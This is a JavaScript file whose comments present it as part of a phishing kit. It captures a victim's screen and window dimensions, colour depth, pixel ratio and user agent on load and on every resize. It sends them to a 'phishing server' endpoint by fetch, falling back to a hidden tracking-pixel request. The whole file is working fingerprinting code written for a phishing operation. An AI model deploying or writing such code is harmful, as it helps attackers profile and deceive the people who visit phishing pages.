/**
 * Screen Dimension Capture Script
 * This script captures the victim's screen dimensions and sends them to the phishing server
 */

(function() {
    'use strict';
    
    // Get victim's screen dimensions
    function captureScreenDimensions() {
        const screenData = {
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            availWidth: window.screen.availWidth,
            availHeight: window.screen.availHeight,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        console.log('📐 Screen dimensions captured:', screenData);
        
        // Send to phishing server (replace with your server URL)
        const serverUrl = window.location.origin;
        
        // Try to send via fetch
        if (typeof fetch !== 'undefined') {
            fetch(serverUrl + '/api/capture-screen-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(screenData)
            }).catch(err => {
                console.warn('Failed to send screen data via fetch:', err);
                sendViaImage(screenData);
            });
        } else {
            sendViaImage(screenData);
        }
    }
    
    // Fallback method using image pixel tracking
    function sendViaImage(screenData) {
        const img = new Image();
        const params = new URLSearchParams(screenData);
        img.src = window.location.origin + '/api/track-screen?' + params.toString();
        img.style.display = 'none';
        document.body.appendChild(img);
    }
    
    // Capture dimensions immediately
    captureScreenDimensions();
    
    // Also capture when window is resized
    window.addEventListener('resize', captureScreenDimensions);
    
    // Capture after page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', captureScreenDimensions);
    }
    
})();
